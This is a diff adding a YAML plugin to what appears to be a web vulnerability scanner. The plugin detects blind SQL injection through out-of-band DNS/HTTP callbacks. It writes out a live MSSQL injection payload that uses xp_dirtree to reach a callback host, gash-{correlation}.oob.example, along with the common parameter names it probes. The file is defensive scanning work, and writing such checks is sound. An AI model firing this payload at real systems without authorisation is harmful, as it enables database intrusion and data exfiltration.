@@ -1,0 +1,31 @@
+# SPDX-License-Identifier: AGPL-3.0-only
+# Copyright (C) 2026 Xmar1881 / GASH contributors
+# Module: github.com/Xmar1881/Gash
+#
+# File: plugins/blind-sqli-oob/blind-sqli-oob.yaml
+# What: Tier 1 blind SQLi plugin backed by OOBOracle (requires --oob-server).
+# Why: Detects blind SQL injection via out-of-band DNS/HTTP callback exfiltration.
+
+id: blind-sqli-oob
+name: Blind SQL Injection OOB
+description: Detects blind SQL injection via out-of-band DNS/HTTP callback exfiltration.
+author: GASH contributors
+severity: critical
+tags: [sqli, blind, oob, injection, data-exfiltration]
+safe: false
+deep: false
+active: true
+requires_auth: false
+phase: probe
+order: 65
+api_version: "1.0"
+oob: required
+tests: tests/fixtures/blind-sqli-oob/
+request:
+  method: GET
+  param_names: [id, query, search, q, page, cat, item, user]
+  payload: "'; EXEC master..xp_dirtree '\\\\gash-{correlation}.oob.example\\share'--"
+oracle:
+  name: oob
+  params:
+    namespace: "sqli"
